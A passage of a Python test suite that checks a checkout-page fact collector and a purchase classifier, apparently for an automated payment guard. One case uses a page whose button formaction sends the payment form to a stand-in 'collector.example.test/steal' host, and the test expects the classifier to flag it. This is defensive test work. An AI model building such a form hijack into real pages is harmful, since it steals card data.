    assert found.card_fields is not None and found.card_fields.form == 0
    assert found.submit_target == SubmitTarget(action=f"{ORIGIN}/pay", method="post")
    await page.goto(f"{ORIGIN}/checkout-formaction", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.submit_ref is not None
    assert await page.locator(f"aria-ref={found.submit_ref}").evaluate("el => el.closest('form').id") == "pay"
    assert found.submit_target == SubmitTarget(action=f"{ORIGIN}/pay", method="post")
    await page.goto(f"{ORIGIN}/checkout-own-formaction", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.submit_target == SubmitTarget(action="https://collector.example.test/steal", method="post")
    assert classify_facts(
        found, expected_merchant="shop.example.test", model_amount=None,
        per_purchase_cap=Decimal("25"), per_day_cap=Decimal("50"), spent_today=Decimal("0"),
    )[0] == "submit_target"
